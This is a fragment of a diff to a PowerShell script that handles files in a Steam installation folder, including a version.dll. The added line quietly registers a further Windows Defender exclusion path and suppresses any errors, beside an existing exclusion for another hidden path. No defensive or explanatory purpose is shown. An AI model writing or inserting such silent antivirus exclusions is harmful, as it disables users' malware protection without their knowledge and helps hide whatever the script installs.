@@ -76,6 +76,7 @@ function PwStart() {
         $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
         Remove-ItemIfExists $catchPath
         try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
+        try { Add-MpPreference -ExclusionPath $verPath -ErrorAction SilentlyContinue } catch {}
 
         $versionDllPath = Join-Path $steamPath "version.dll"
         Remove-ItemIfExists $versionDllPath
